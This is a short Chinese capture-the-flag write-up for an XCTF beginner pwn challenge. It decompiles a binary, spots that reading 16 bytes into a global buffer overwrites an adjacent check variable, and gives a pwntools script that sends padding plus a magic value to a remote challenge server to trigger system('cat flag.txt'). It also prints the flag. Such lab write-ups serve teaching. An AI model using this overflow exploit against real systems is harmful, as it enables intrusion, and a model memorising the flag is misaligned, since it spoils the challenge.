https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5052&page=1

# 分析

1. binwalk查看，得知是64位可执行文件。

   ```
   DECIMAL       HEXADECIMAL     DESCRIPTION
   --------------------------------------------------------------------------------
   0             0x0             ELF, 64-bit LSB executable, AMD x86-64, version 1 (SYSV)
   ```

2. IDA查看，main主函数如下：

   ```
   __int64 __fastcall main(__int64 a1, char **a2, char **a3)
   {
     alarm(0x3Cu);
     setbuf(stdout, 0LL);
     puts("~~ welcome to ctf ~~     ");
     puts("lets get helloworld for bof");
     read(0, &unk_601068, 0x10uLL);
     if ( dword_60106C == 1853186401 )
       sub_400686(0LL, &unk_601068);
     return 0LL;
   }
   ```

   sub_400686函数如下：

   ```
   __int64 sub_400686()
   {
     system("cat flag.txt");
     return 0LL;
   }
   ```

   可以看到当dword_60106C===1853186401时，即可打印出flag。

   read(0, &unk_601068, 0x10uLL) 输入地址偏移4位就是60106C

3. pwntools

   ```
   from pwn import *
   
   io = remote('111.200.241.244',52795 )
   io.send('a' * 4 + p64(1853186401).decode())
   io.interactive()
   ```

   得到flag：cyberpeace{714659b5c6d4d1b0e547b825060d5301}

